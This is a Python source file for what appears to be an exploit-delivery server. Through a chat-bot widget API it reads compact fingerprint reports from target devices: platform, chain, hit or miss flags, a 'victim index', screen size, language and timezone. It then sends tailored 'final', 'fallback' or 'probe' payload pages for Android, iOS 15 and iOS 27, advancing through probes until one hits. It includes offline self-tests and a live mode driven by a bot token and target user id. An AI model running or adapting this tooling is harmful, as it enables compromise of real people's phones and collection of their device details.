#!/usr/bin/env python3
"""Unified two-phase answer/send server — Android + iOS 15 + iOS 27 (host artifact).

Report v3: "P3" + 62 hex (31 bytes, 64 chars = request-data limit):
  0 ver=3  1 platform(1=A13,2=iOS15,3=iOS27)  2 chain(1=route2,3=holes,4=parser)
  3 flags: bit0 hit, bit1 safe, bit2 answer, bit3 timed
  4 att   5-6 sel (H / victim index)   7-8 n (anchor / HIT)
  9-10 hd (header / VK)   11 cb (class / PH)
  12 dpr  13-14 sw  15-16 sh  17-18 lang  19 tz+128
  20-21 elapsed  22-23 padM  24 N/100  25 SZ/4  26 UBn  27 UBsz/8
  28-30 t_rep low 24 bits (device ms)
Legacy P2 (23 bytes) is still parsed.

Flow:
  detector query data = P3...  -> parse, map, ACK "K", sendWidget(target)
  fallback chunk data = E<i>   -> answerWidgetQuery(data=chunk i)

Mapping (platforms.json):
  1 android_route2 : hit -> final_inline.html ; miss -> final_fallback.html
  2 ios15_holes    : hit -> ios15/at_final_h<sel>.html ; miss -> next probe by H order
  3 ios27_parser   : safe handshake or hit -> ios27/final_ios27.html (or pad-first
                     final_ios27_m<padM>.html); miss -> re-send the final after
                     the 3 s cooldown (the final itself is a safe miss)

Offline: --self-test (all rows), --simulate (hit+miss per platform),
         --manual-report <hex> --chat <id> (iOS 15 relay path; dry by default).
Live (only after approval; one getUpdates consumer):
  BOT_TOKEN=... python3 bot_two_phase.py --uid 10290 --chunks chunks
"""
import hashlib
import json
import os
import sys
import time

HERE = os.path.dirname(os.path.abspath(__file__))
for _p in (os.path.join(HERE, "..", "pixel72801_route2", "oob"),
           os.path.join(HERE, "..", "..", "lab", "pixel72801_route2", "oob"),
           os.path.join(HERE, "..", "..", "bot")):
    if os.path.isdir(_p):
        sys.path.insert(0, _p)
import bot_server as bs  # noqa: E402

# The repo mirror keeps the server in scripts/two_phase and the pages in
# payloads/two_phase; the lab keeps both next to this file.
_DATA_DIRS = (HERE, os.path.join(HERE, "..", "..", "payloads", "two_phase"))


def _data_path(rel):
    for base in _DATA_DIRS:
        p = os.path.join(base, rel)
        if os.path.exists(p):
            return p
    return os.path.join(HERE, rel)


def _chunks_dir():
    """Use the lab chunks if present, else the repo P2 chunk set for tests."""
    for p in (os.path.join(HERE, "chunks"),
              os.path.join(HERE, "..", "..", "bot", "chunks")):
        if os.path.exists(os.path.join(p, "manifest.json")):
            return p
    return os.path.join(HERE, "chunks")

REPORT_LEN = 31
LEGACY_REPORT_LEN = 23
IOS15_H_ORDER = [400, 200, 64, 500]


def parse_report(data):
    if not isinstance(data, str) or len(data) < 4:
        return None
    if data.startswith("P3"):
        if len(data) != 2 + 2 * REPORT_LEN:
            return None
        try:
            b = bytes.fromhex(data[2:])
        except ValueError:
            return None
        if len(b) != REPORT_LEN or b[0] != 3:
            return None
        f = b[3]
        return {
            "ver": 3, "platform": b[1], "chain": b[2], "flags": f,
            "hit": bool(f & 1), "safe": bool(f & 2), "answer": bool(f & 4),
            "timed": bool(f & 8), "att": b[4],
            "sel": (b[5] << 8) | b[6], "n": (b[7] << 8) | b[8],
            "hd": (b[9] << 8) | b[10], "cb": b[11],
            "dpr": b[12] / 10.0, "sw": (b[13] << 8) | b[14],
            "sh": (b[15] << 8) | b[16],
            "lang": chr(b[17]) + chr(b[18]), "tz": (b[19] - 128) * 15,
            "elapsed": (b[20] << 8) | b[21],
            "padM": (b[22] << 8) | b[23], "N": b[24] * 100,
            "SZ": b[25] * 4, "UBn": b[26], "UBsz": b[27] * 8,
            "t_rep": (b[28] << 16) | (b[29] << 8) | b[30],
        }
    # legacy P2 (23 bytes): Android detector builds before the P3 upgrade
    if data.startswith("P2") and len(data) == 2 + 2 * LEGACY_REPORT_LEN:
        try:
            b = bytes.fromhex(data[2:])
        except ValueError:
            return None
        if len(b) != LEGACY_REPORT_LEN or b[0] != 2:
            return None
        return {
            "ver": 2, "platform": b[1], "chain": b[2], "flags": 1 if b[3] else 0,
            "hit": b[3] == 1, "safe": False, "answer": True, "timed": False,
            "att": b[4], "sel": (b[5] << 8) | b[6], "n": (b[7] << 8) | b[8],
            "hd": (b[9] << 8) | b[10], "cb": b[11],
            "dpr": b[12] / 10.0, "sw": (b[13] << 8) | b[14],
            "sh": (b[15] << 8) | b[16],
            "lang": chr(b[17]) + chr(b[18]), "tz": (b[19] - 128) * 15,
            "profile": b[20], "elapsed": (b[21] << 8) | b[22],
            "padM": 0, "N": 0, "SZ": 0, "UBn": 0, "UBsz": 0, "t_rep": 0,
        }
    return None


def pack_report(platform, chain, hit=False, att=255, sel=0, n=0xFFFF, hd=0, cb=0,
                dpr=1.0, sw=0, sh=0, lang="it", tz=-60, elapsed=0,
                padM=0, N=0, SZ=0, UBn=0, UBsz=0, t_rep=0,
                safe=False, answer=True, timed=False):
    flags = (1 if hit else 0) | (2 if safe else 0) | (4 if answer else 0) | (8 if timed else 0)
    b = [3, platform & 255, chain & 255, flags, att & 255,
         (sel >> 8) & 255, sel & 255, (n >> 8) & 255, n & 255,
         (hd >> 8) & 255, hd & 255, cb & 255,
         min(255, round(dpr * 10)), (sw >> 8) & 255, sw & 255,
         (sh >> 8) & 255, sh & 255,
         ord(lang[0]) & 255, ord(lang[1]) & 255,
         min(255, max(0, round(tz / 15) + 128)),
         (elapsed >> 8) & 255, elapsed & 255,
         (padM >> 8) & 255, padM & 255,
         min(255, (N or 0) // 100), min(255, (SZ or 0) // 4), UBn & 255,
         min(255, (UBsz or 0) // 8),
         (t_rep >> 16) & 255, (t_rep >> 8) & 255, t_rep & 255]
    assert len(b) == REPORT_LEN
    return "P3" + "".join("%02x" % x for x in b)


def target_for(rep, table, dev=None):
    """Map a report to (kind, relative file, note).  dev = devices.json[uid]."""
    dev = dev or {}
    if int(rep["platform"]) == 9:
        return ("skip", None, "desktop: early gate fired, no final")
    platform = int(dev.get("platform", rep["platform"]))
    row = table.get(str(platform))
    if row is None:
        return ("skip", None, "unknown platform")
    if platform == 3:  # iOS 27: safe handshake or hit -> the self-sweeping final
        m = dev.get("last_m") or rep.get("padM") or 0
        rel = row.get("finals_by_m", {}).get(str(m), row.get("final"))
        tag = "safe" if rep.get("safe") else ("hit" if rep["hit"] else "miss")
        return ("final", rel, "ios27 M=%s (%s)" % (m, tag))
    if platform == 1 and dev.get("prefer") in ("final", "fallback"):
        pref = dev["prefer"]
        return ("final" if pref == "final" else "fallback",
                row.get("final" if pref == "final" else "fallback"),
                "android prefer=%s" % pref)
    if platform == 2:  # iOS 15: the final is H-specific; a miss advances the probe
        if rep["hit"]:
            f = row["finals"].get(str(rep["sel"]))
            return ("final", f, "ios15 H=%s" % rep["sel"]) if f else ("skip", None, "no final for H")
        if rep["sel"] in IOS15_H_ORDER:
            nxt = IOS15_H_ORDER[(IOS15_H_ORDER.index(rep["sel"]) + 1) % len(IOS15_H_ORDER)]
        else:
            nxt = IOS15_H_ORDER[0]
        return ("probe", row["probes"].get(str(nxt)), "ios15 retry H=%s" % nxt)
    if rep["hit"]:
        return ("final", row.get("final"), row["name"])
    return ("fallback", row.get("fallback"), row["name"])


class TwoPhase(bs.Bot):
    def __init__(self, *a, **kw):
        super().__init__(*a, **kw)
        self.table = json.load(open(_data_path("platforms.json")))
        self.devices = {}
        p = _data_path("devices.json")
        if os.path.exists(p):
            try:
                self.devices = json.load(open(p))
            except Exception:
                self.devices = {}
        self.cache = {}
        self.last_send = 0.0
        self.cooldown = 3.0

    def html(self, rel):
        if rel not in self.cache:
            self.cache[rel] = open(_data_path(rel), encoding="utf-8").read()
        return self.cache[rel]

    def send_widget(self, chat_id, rel, tag):
        h = self.html(rel)
        t1 = time.time()
        if self.dry:
            self.log("DRY SEND", tag, rel, "chat=%s html=%dB sha=%s" % (
                chat_id, len(h.encode()), hashlib.sha256(h.encode()).hexdigest()[:16]))
            return {"ok": True}
        r = self.api("sendWidget", chat_id=chat_id, html=h, height=50,
                     allow_queries=True, background_query=True)
        self.log("SEND", tag, rel, "chat=%s html=%dB" % (chat_id, len(h.encode())),
                 "ok=%s" % r.get("ok"), "rt=%.0fms" % ((time.time() - t1) * 1000),
                 "" if r.get("ok") else repr(r.get("error") or r.get("body"))[:160])
        return r

    def answer_text(self, qid, text):
        if self.dry:
            self.log("DRY ANSWER", "widget_query_id=%s" % qid, "text=%r" % text)
            return {"ok": True}
        for f in ([self.good_field] if self.good_field else self.fields):
            r = self.api(self.method, **{"widget_query_id": qid, f: text})
            if r.get("ok"):
                if not self.good_field:
                    self.good_field = f
                return r
        return r

    def handle(self, update, t0=None):
        q = bs.find_query(update)
        if not q:
            return
        frm = q.get("from") or {}
        if self.uid and frm.get("id") != self.uid:
            self.log("SKIP uid", frm.get("id"))
            return
        data = q.get("data")
        rep = parse_report(data)
        if rep is not None:
            self.on_report(q, rep, t0)
            return
        i = bs.parse_index(data)
        if i is not None:
            super().handle(update, t0)
            return
        self.log("SKIP data", repr(data))

    def on_report(self, q, rep, t0):
        chat = (q.get("chat") or {}).get("id")
        uid = (q.get("from") or {}).get("id")
        dev = self.devices.get(str(uid), {})
        kind, rel, note = target_for(rep, self.table, dev)
        self.log("REPORT", "platform=%d chain=%d hit=%d safe=%d att=%d sel=%d n=%d hd=%d cb=%d "
                 "dpr=%.1f scr=%dx%d lang=%s tz=%d el=%dms padM=%d N=%d SZ=%d UBn=%d UBsz=%d "
                 "t_rep=%d" % (
                     rep["platform"], rep["chain"], rep["hit"], rep["safe"], rep["att"], rep["sel"],
                     rep["n"], rep["hd"], rep["cb"], rep["dpr"], rep["sw"], rep["sh"],
                     rep["lang"], rep["tz"], rep["elapsed"], rep.get("padM", 0), rep.get("N", 0),
                     rep.get("SZ", 0), rep.get("UBn", 0), rep.get("UBsz", 0), rep.get("t_rep", 0)),
                 "dev=%s ->" % dev.get("model", "?"), kind, rel, "(%s)" % note)
        self.answer_text(q.get("id"), "K")
        self.maybe_send(chat, kind, rel)

    def maybe_send(self, chat, kind, rel):
        if kind == "skip" or not rel:
            return
        now = time.time()
        if now - self.last_send < self.cooldown:
            self.log("SKIP send: cooldown")
            return
        self.last_send = now
        tag = {"final": "final", "fallback": "fallback", "probe": "next-probe"}[kind]
        self.send_widget(chat, rel, tag)
        if kind == "fallback" and rel.endswith("final_fallback.html"):
            self.log("FALLBACK active: %d chunks" % len(self.chunks))

    def manual_report(self, rep_hex, chat, uid=None):
        rep = parse_report(rep_hex)
        if rep is None:
            self.log("MANUAL report invalid", repr(rep_hex))
            return 1
        dev = self.devices.get(str(uid), {}) if uid is not None else {}
        kind, rel, note = target_for(rep, self.table, dev)
        self.log("MANUAL", "platform=%d hit=%d safe=%d sel=%d" % (
            rep["platform"], rep["hit"], rep["safe"], rep["sel"]),
            "->", kind, rel, "(%s)" % note)
        self.maybe_send(chat, kind, rel)
        return 0


def self_test():
    ok = True
    r = pack_report(1, 1, True, att=0, sel=599, n=0x123, hd=0x57, cb=30, dpr=2.8,
                    sw=1080, sh=2340, lang="it", tz=-60, elapsed=321)
    d = parse_report(r)
    ok &= d and d["platform"] == 1 and d["hit"] and d["sel"] == 599 and d["dpr"] == 2.8
    ok &= len(r) == 2 + 2 * REPORT_LEN and len(r) == 64
    # iOS 15 rows: hit H400 -> at_final_h400; miss H400 -> at_probe_h200
    table = json.load(open(_data_path("platforms.json")))
    rep = parse_report(pack_report(2, 3, True, sel=400, n=545, hd=598, cb=36))
    ok &= target_for(rep, table)[:2] == ("final", "ios15_gated/at_final_h400.html")
    rep = parse_report(pack_report(2, 3, False, sel=400))
    ok &= target_for(rep, table)[:2] == ("probe", "ios15_gated/at_probe_h200.html")
    # iOS 27 safe handshake -> the self-sweeping final; padM selects the pad-first twin
    rep = parse_report(pack_report(3, 4, safe=True, hit=False, padM=768, N=2600, SZ=957,
                                    UBn=24, UBsz=576, n=545, hd=598, cb=12,
                                    t_rep=0x123456, elapsed=42))
    ok &= target_for(rep, table)[:2] == ("final", "ios27_gated/final_ios27_m768.html")
    rep0 = parse_report(pack_report(3, 4, safe=True, padM=0))
    ok &= target_for(rep0, table)[:2] == ("final", "ios27_gated/final_ios27.html")
    dev = {"platform": 3, "last_m": 640}
    ok &= target_for(rep, table, dev)[:2] == ("final", "ios27_gated/final_ios27_m640.html")
    # legacy P2 still accepted (old Android detector / old relay output)
    p2 = "P202020301000190022102562400000000003f3f80010000"
    d2 = parse_report(p2)
    ok &= d2 is not None and d2["ver"] == 2 and d2["platform"] == 2 and d2["hit"] \
        and d2["sel"] == 400 and d2["n"] == 545 and d2["hd"] == 598 and d2["cb"] == 36
    rep = parse_report(pack_report(1, 1, False))
    ok &= target_for(rep, table)[:2] == ("fallback", "final_fallback.html")
    rep = parse_report(pack_report(9, 0, False))
    ok &= target_for(rep, table)[0] == "skip"
    ok &= parse_report("P3zz") is None and parse_report("E0") is None
    print("SELF-TEST", "PASS" if ok else "FAIL", "| report len", len(r))
    return 0 if ok else 1


def simulate():
    os.makedirs(os.path.join(HERE, "state"), exist_ok=True)
    log = os.path.join(HERE, "state", "simulate.log")
    open(log, "w").close()
    b = TwoPhase("-", _chunks_dir(), 10290, "answerWidgetQuery",
                 True, log, ["data"])
    b.cooldown = 0.0
    def q(qid, data, msg):
        return {"update_id": 1, "widget_query": {"id": qid, "data": data,
                "from": {"id": 10290}, "chat": {"id": 0}, "message_id": msg}}
    b.handle(q("a1", pack_report(1, 1, True, att=0), 100))
    b.handle(q("a2", pack_report(1, 1, False), 101))
    b.handle(q("i1", pack_report(2, 3, True, sel=400, n=545, hd=598, cb=36), 102))
    b.handle(q("i2", pack_report(2, 3, False, sel=400), 103))
    b.handle(q("j1", pack_report(3, 4, safe=True, padM=768, n=545, hd=598, cb=12,
                                 N=2600, SZ=957, UBn=24, UBsz=576), 104))
    b.handle(q("j2", pack_report(3, 4, safe=True, padM=0), 105))
    b.handle(q("d9", pack_report(9, 0, False), 106))
    b.handle(q("e0", "E0", 101))
    txt = open(log).read()
    need = ["final_inline.html", "final_fallback.html", "ios15_gated/at_final_h400.html",
            "ios15_gated/at_probe_h200.html", "ios27_gated/final_ios27_m768.html",
            "ios27_gated/final_ios27.html", "i=0"]
    ok = all(n in txt for n in need)
    print("SIMULATE", "PASS" if ok else "FAIL")
    print(txt[-1600:])
    return 0 if ok else 1


if __name__ == "__main__":
    if "--self-test" in sys.argv:
        sys.exit(self_test())
    if "--simulate" in sys.argv:
        sys.exit(simulate())
    if "--check-report" in sys.argv:
        rep = sys.argv[sys.argv.index("--check-report") + 1]
        d = parse_report(rep)
        if d is None:
            print("INVALID", len(rep))
            sys.exit(1)
        print(json.dumps(d, sort_keys=True))
        sys.exit(0)
    if "--manual-report" in sys.argv:
        rep = sys.argv[sys.argv.index("--manual-report") + 1]
        chat = int(sys.argv[sys.argv.index("--chat") + 1]) if "--chat" in sys.argv else 0
        dry = "--live" not in sys.argv
        b = TwoPhase("-", _chunks_dir(), 10290, "answerWidgetQuery",
                     dry, os.path.join(HERE, "state", "manual.log"), ["data"])
        b.cooldown = 0.0
        sys.exit(b.manual_report(rep, chat))
    bs.Bot = TwoPhase
    sys.exit(bs.main())
